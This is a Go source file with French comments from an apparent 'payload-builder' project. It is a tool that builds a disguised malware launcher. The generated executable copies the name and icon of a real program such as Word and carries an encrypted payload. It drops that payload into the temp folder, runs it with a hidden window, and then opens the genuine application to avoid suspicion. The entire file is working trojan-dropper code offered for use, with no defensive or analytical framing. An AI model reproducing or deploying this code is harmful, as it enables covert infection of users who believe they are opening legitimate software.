/*
cover — lanceur camouflé du payload.

Produit un exécutable qui porte le nom et l'icône d'un vrai programme
(par défaut ceux de -target, ex. WINWORD.EXE), dépose et démarre le payload
chiffré en arrière-plan, puis lance le vrai programme : double-clic sur
« Word » → le payload part, Word s'ouvre.

	go run ./cmd/cover -payload payload.exe \
		-target "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"

Le lanceur est compilé comme module autonome (aucune dépendance) : le
payload chiffré par internal/seal est écrit dans un dossier temporaire avec
go:embed, et la clé de déchiffrement injectée dans la source générée.

Drapeaux :
  -payload   exécutable à embarquer (défaut payload.exe, produit par cmd/builder)
  -target    vrai programme à lancer après le payload (optionnel)
  -targs     arguments de la cible
  -name      nom du produit sans extension (défaut : base de -target)
  -icon      fichier .ico (défaut : extraction depuis -target)
  -out       chemin de sortie (défaut .\<name>.exe)
  -no-icon   ne pas intégrer d'icône (skip rsrc)
*/
package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"payload-builder/internal/seal"
)

func main() {
	var (
		payloadPath = flag.String("payload", "payload.exe", "exécutable du module à embarquer")
		target      = flag.String("target", "", "vrai programme à lancer après le payload")
		targs       = flag.String("targs", "", "arguments de la cible (une seule chaîne)")
		name        = flag.String("name", "", "nom du produit sans extension")
		icoPath     = flag.String("icon", "", "fichier .ico (défaut : extraction depuis -target)")
		out         = flag.String("out", "", "chemin de sortie (défaut .\\<name>.exe)")
		noIcon      = flag.Bool("no-icon", false, "ne pas intégrer d'icône")
	)
	flag.Parse()

	root, err := findRoot(".")
	if err != nil {
		fail("racine du module introuvable :", err)
	}

	// --- payload chiffré ----------------------------------------------
	plain, err := os.ReadFile(absFrom(root, *payloadPath))
	if err != nil {
		fail("payload illisible (-payload) :", err)
	}
	enc, err := seal.Seal(plain)
	if err != nil {
		fail("chiffrement impossible :", err)
	}

	baseName := *name
	if baseName == "" && *target != "" {
		baseName = strings.TrimSuffix(filepath.Base(*target), filepath.Ext(*target))
	}
	if baseName == "" {
		baseName = "Document"
	}
	outPath := *out
	if outPath == "" {
		outPath = baseName + ".exe"
	}
	outAbs, err := filepath.Abs(outPath)
	if err != nil {
		fail("", err)
	}

	// --- module temporaire du lanceur ---------------------------------
	work, err := os.MkdirTemp("", "coverbuild-*")
	if err != nil {
		fail("", err)
	}
	defer os.RemoveAll(work)

	write(filepath.Join(work, "go.mod"), []byte("module coverbuild\n\ngo 1.26.7\n"))
	write(filepath.Join(work, "payload.enc"), enc)

	key := make([]byte, 0, 3*len(seal.Key()))
	for i, b := range seal.Key() {
		if i > 0 {
			key = append(key, ',', ' ')
		}
		key = append(key, fmt.Sprintf("0x%02x", b)...)
	}
	src := strings.NewReplacer(
		"{{KEY}}", string(key),
		"{{TARGET}}", escape(*target),
		"{{TARGS}}", escape(*targs),
		"{{BASE}}", escape(baseName),
	).Replace(coverMain)
	write(filepath.Join(work, "main.go"), []byte(src))

	// --- icône : fournie ou extraite de la cible ------------------------
	if !*noIcon {
		ico := []byte(nil)
		if *icoPath != "" {
			ico, err = os.ReadFile(absFrom(root, *icoPath))
			if err != nil {
				fail("icône illisible (-icon) :", err)
			}
		} else if *target != "" {
			tPath := absFrom(root, *target)
			ico, err = extractIcon(tPath)
			if err != nil {
				fmt.Fprintf(os.Stderr, "cover: icône non extraite de %s (%v) — icône sautée\n", tPath, err)
			}
		}
		if len(ico) > 0 {
			write(filepath.Join(work, "cover.ico"), ico)
			if err := runRsrc(work); err != nil {
				fmt.Fprintf(os.Stderr, "cover: icône non intégrée (%v)\n", err)
			}
		}
	}

	// --- compilation ----------------------------------------------------
	build := exec.Command("go", "build", "-ldflags", "-H windowsgui -s -w", "-o", outAbs, ".")
	build.Dir = work
	build.Stdout = os.Stdout
	build.Stderr = os.Stderr
	if err := build.Run(); err != nil {
		fail("compilation du lanceur :", err)
	}

	fmt.Printf("cover: OK -> %s (%d octets embarqués, cible %q)\n", outAbs, len(plain), *target)
}

// runRsrc compile l'icône dans rsrc.syso via github.com/akavel/rsrc.
func runRsrc(work string) error {
	if exe := rsrcExe(); exe != "" {
		c := exec.Command(exe, "-arch", "amd64", "-ico", filepath.Join(work, "cover.ico"), "-o", filepath.Join(work, "rsrc.syso"))
		c.Dir = work
		if out, err := c.CombinedOutput(); err != nil {
			return fmt.Errorf("rsrc: %v (%s)", err, strings.TrimSpace(string(out)))
		}
		return nil
	}
	c := exec.Command("go", "run", "github.com/akavel/rsrc@latest",
		"-arch", "amd64", "-ico", filepath.Join(work, "cover.ico"), "-o", filepath.Join(work, "rsrc.syso"))
	c.Dir = work
	if out, err := c.CombinedOutput(); err != nil {
		return fmt.Errorf("rsrc: %v (%s)", err, strings.TrimSpace(string(out)))
	}
	return nil
}

func rsrcExe() string {
	gopath := os.Getenv("GOPATH")
	if gopath == "" {
		home, _ := os.UserHomeDir()
		gopath = filepath.Join(home, "go")
	}
	p := filepath.Join(gopath, "bin", "rsrc.exe")
	if st, err := os.Stat(p); err == nil && !st.IsDir() {
		return p
	}
	return ""
}

// coverMain est la source du lanceur (module autonome, go:embed payload.enc).
// Les {{…}} sont remplacés par le builder.
const coverMain = `// Lanceur camouflé — généré par cmd/cover. Ne pas éditer à la main.
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"embed"
	"errors"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

//go:embed payload.enc
var enc []byte

var (
	sealKey         = []byte{ {{KEY}} }
	coverTarget     = "{{TARGET}}"
	coverTargetArgs = "{{TARGS}}"
	coverName       = "{{BASE}}"
)

func payloadPlain() ([]byte, error) {
	if len(enc) < 12+16 {
		return nil, errors.New("payload.enc trop court")
	}
	block, err := aes.NewCipher(sealKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	ns := gcm.NonceSize()
	return gcm.Open(nil, enc[:ns], enc[ns:], nil)
}

func journal(msg string) {
	f, err := os.OpenFile(filepath.Join(os.Getenv("TEMP"), coverName+"_cover.log"),
		os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0666)
	if err != nil {
		return
	}
	fmt.Fprintf(f, "%s %s\n", time.Now().Format(time.RFC3339), msg)
	f.Close()
}

func startHidden(path string, args []string) error {
	c := exec.Command(path, args...)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	return c.Start()
}

// resolveTarget cherche le vrai programme : chemin exact, préfixes des
// variables d'environnement, puis PATH.
func resolveTarget() string {
	if coverTarget == "" {
		return ""
	}
	if st, err := os.Stat(coverTarget); err == nil && !st.IsDir() {
		return coverTarget
	}
	base := filepath.Base(coverTarget)
	rest := filepath.Dir(coverTarget)
	for _, prefix := range []string{"C:\\", filepath.VolumeName(coverTarget) + "\\"} {
		if len(rest) >= len(prefix) && strings.EqualFold(rest[:len(prefix)], prefix) {
			rest = rest[len(prefix):]
			break
		}
	}
	rest = strings.ReplaceAll(rest, "\\", "/")
	for _, rootVar := range []string{"ProgramFiles", "ProgramFiles(x86)", "LOCALAPPDATA"} {
		if root := os.Getenv(rootVar); root != "" {
			p := filepath.Join(root, filepath.FromSlash(rest))
			if st, err := os.Stat(p); err == nil && !st.IsDir() {
				return p
			}
		}
	}
	if p, err := exec.LookPath(base); err == nil {
		return p
	}
	return ""
}

func main() {
	// 1. Le payload part en arrière-plan, déposé dans %TEMP% sous un nom
	//    lié au programme imité ; sa propre persistance le copie au miroir
	//    pendant le boot, ce fichier n'est plus qu'un véhicule.
	if plain, err := payloadPlain(); err == nil {
		p := filepath.Join(os.Getenv("TEMP"),
			fmt.Sprintf("%s_%05d.exe", coverName, rand.Intn(100000)))
		if werr := os.WriteFile(p, plain, 0666); werr == nil {
			if serr := startHidden(p, nil); serr != nil {
				journal("payload start: " + serr.Error())
			}
		} else {
			journal("payload write: " + werr.Error())
		}
	} else {
		journal("payload open: " + err.Error())
	}

	// 2. La vraie application s'ouvre — visible, comme d'habitude.
	if t := resolveTarget(); t != "" {
		var args []string
		if coverTargetArgs != "" {
			args = strings.Fields(coverTargetArgs)
		}
		c := exec.Command(t, args...)
		if err := c.Start(); err != nil {
			journal("target: " + err.Error())
		}
	}
}
`

// findRoot remonte jusqu'au dossier contenant go.mod.
func findRoot(start string) (string, error) {
	dir, err := filepath.Abs(start)
	if err != nil {
		return "", err
	}
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir, nil
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return "", fmt.Errorf("go.mod introuvable au-dessus de %s", start)
		}
		dir = parent
	}
}

func absFrom(root, p string) string {
	if filepath.IsAbs(p) {
		return p
	}
	return filepath.Join(root, p)
}

func write(path string, data []byte) {
	if err := os.WriteFile(path, data, 0644); err != nil {
		fail("écriture "+path+" :", err)
	}
}

func escape(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	return strings.ReplaceAll(s, `"`, `\"`)
}

func fail(msg string, err error) {
	if msg != "" {
		fmt.Fprintln(os.Stderr, "cover:", msg, err)
	} else {
		fmt.Fprintln(os.Stderr, "cover:", err)
	}
	os.Exit(1)
}
